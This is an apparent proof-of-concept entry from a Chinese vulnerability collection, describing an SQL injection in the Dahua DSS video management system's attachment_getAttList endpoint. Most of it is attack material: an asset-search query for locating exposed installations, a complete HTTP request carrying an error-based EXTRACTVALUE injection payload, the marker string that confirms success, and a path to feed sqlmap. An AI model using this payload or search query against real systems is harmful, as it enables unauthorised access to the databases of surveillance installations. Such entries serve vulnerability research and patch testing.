---
fofa: "app.name=="
source: "wy876 漏洞文库"
---

# 大华 DSS 视频管理系统attachment_getAttList存在SQL注入漏洞

# 一、漏洞简介
大华 DSS 视频管理系统attachment_getAttList存在SQL注入漏洞

# 二、影响版本
+ 大华 DSS 视频管理系统

# 三、资产测绘
+ hunter：`app.name=="Dahua 大华 DSS 视频管理系统"`


+ 登录页面


# 四、漏洞复现
```java
GET /portal/attachment_getAttList.action?bean.RecId=1%27)%20AND%20EXTRACTVALUE(8841,CONCAT(0x5c,0x716b6b6b71,(SELECT%20(ELT(8841=8841,1))),0x7178786271))%20AND%20(%27mYhO%27=%27mYhO&bean.TabName=1 HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Connection: close
Content-Length: 345
Accept-Encoding: gzip
```


```java
qkkkq1qxxbq
```

sqlmap

```java
/portal/attachment_getAttList.action?bean.RecId=1&bean.TabName=1
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/fqfir04lszoxzfkb>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
